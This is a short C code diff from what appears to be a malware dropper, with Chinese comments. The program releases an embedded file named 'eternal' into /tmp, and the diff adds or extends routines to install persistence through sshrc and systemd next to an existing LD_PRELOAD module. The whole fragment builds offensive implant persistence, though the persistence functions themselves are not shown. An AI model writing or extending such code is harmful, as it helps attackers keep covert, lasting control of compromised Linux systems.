@@ -17,6 +17,10 @@
 #include "linux_persistence_ld_preload.h"
 #endif
 
+#ifdef SSHRC_MOD
+#include "linux_persistence_sshrc.h"
+#endif
+
 int main() {
     printf("释放嵌入的文件...\n");
     release_file("/tmp/eternal", eternal, eternal_size);  // 确保这些变量已在 bind_files.h 中声明
@@ -57,6 +61,14 @@ int main() {
 #ifdef SSHRC_MOD
     if (strcmp(os, "linux") == 0) {
         setup_user_sshrc_persistence();
+    } else {
+        printf("不支持的操作系统。\n");
+    }
+#endif
+
+#ifdef SYSTEMD_MOD
+    if (strcmp(os, "linux") == 0) {
+        setup_systemd_persistence();
     } else {
         printf("不支持的操作系统。\n");
     }
